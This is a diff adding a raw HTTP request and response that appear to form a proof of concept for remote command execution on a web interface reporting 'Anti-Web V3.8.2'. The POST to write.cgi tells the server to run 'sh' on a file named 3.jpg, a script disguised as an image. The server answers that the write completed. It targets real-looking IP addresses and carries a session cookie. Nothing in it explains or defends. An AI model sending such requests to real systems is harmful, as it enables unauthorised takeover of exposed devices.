@@ -1,0 +1,26 @@
+POST /cgi-bin/write.cgi HTTP/1.1
+Host: 78.67.29.120
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-AR,en-US;q=0.7,en;q=0.3
+Referer: http://217.179.198.16/
+Cookie: ID=0bce4b7eb065092efd274212b25c50e1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+script1=execute&path1=sh /home/httpd/pageimages/3.jpg
+
+
+
+
+############
+
+response:
+
+HTTP/1.1 200 OK
+Server: Anti-Web V3.8.2
+Content-type: text/html
+Content-length: 82
+
+<html><head><title>Untitled</title></head><body>write.cgi completed.</body></html>
